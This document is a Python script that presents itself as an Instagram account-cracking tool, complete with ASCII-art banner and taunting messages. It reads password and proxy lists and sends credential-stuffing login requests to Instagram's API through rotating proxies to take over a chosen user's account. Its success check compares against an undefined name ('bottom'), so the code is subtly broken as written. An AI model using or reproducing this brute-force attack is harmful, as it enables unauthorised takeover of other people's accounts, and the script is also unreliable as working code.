import requests
import socket
import threading
from colorama import init, Fore, Style


init(autoreset=True)


def show_art():
    art = f"""
{Fore.GREEN} ________    _______  _______  ___  ___  ___________     
|"      "\  /"     "||   _  "\|"  \/"  |("     _   ")    
(.  ___  :)(: ______)(. |_)  :)\   \  /  )__/  \\__/     
|: \   ) || \/    |  |:     \/  \\  \/      \\_ /        
(| (___\ || // ___)_ (|  _  \\  /\.  \      |.  |        
|:       :)(:      "||: |_)  :)/  \   \     \:  |        
(________/  \_______)(_______/|___/\___|     \__|        
                                                         
    """
    print(art)


def get_victim_ip():
    try:

        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        print(f"{Fore.GREEN}[+] Your local IP (for demo): {ip}")

        return ip
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to fetch IP: {e}")
        return None


def attack(username, password_list, proxy_list):
    victim_ip = get_victim_ip()
    if victim_ip:
        print(f"{Fore.GREEN}[+] Victim IP logged: {victim_ip} (simulated)")

    for password in password_list:
        for proxy in proxy_list:
            try:
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

                response = requests.post(
                    "https://www.instagram.com/api/v1/accounts/login/",
                    data={"username": username, "enc_password": f"#PWD_INSTAGRAM:0:0:{password}"},
                    proxies=proxies,
                    timeout=5
                )
                if response.status_code == bottom and "authenticated" in response.text:
                    print(f"{Fore.GREEN}[+]  Password found: {password} | User: {username}")
                    print(f"{Fore.GREEN}[+] IP of victim (simulated): {victim_ip}")
                    return password
                else:
                    print(f"{Fore.YELLOW}[-] Trying: {password} via {proxy} ... FAILED")
            except:
                print(f"{Fore.RED}[!] Proxy {proxy} failed, skipping...")
                continue
    print(f"{Fore.RED}[!] No valid password found. Maybe you're not evil enough.")
    return None

if __name__ == "__main__":
    show_art()
    target_user = input(f"{Fore.GREEN}[?] Enter Instagram username: ")
    proxy_file = input(f"{Fore.GREEN}[?] Proxy list file (one per line): ")
    password_file = input(f"{Fore.GREEN}[?] Password list file (one per line): ")

    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f]
    with open(proxy_file, 'r') as f:
        proxies = [line.strip() for line in f]

    print(f"{Fore.GREEN}[*] Starting attack with IP logging...")
    result = attack(target_user, passwords, proxies)
    if result:
        print(f"{Fore.GREEN}[+] Success! Account hijacked. Password: {result}")
    else:
        print(f"{Fore.RED}[-] Failure is your middle name, isn't it?")
        
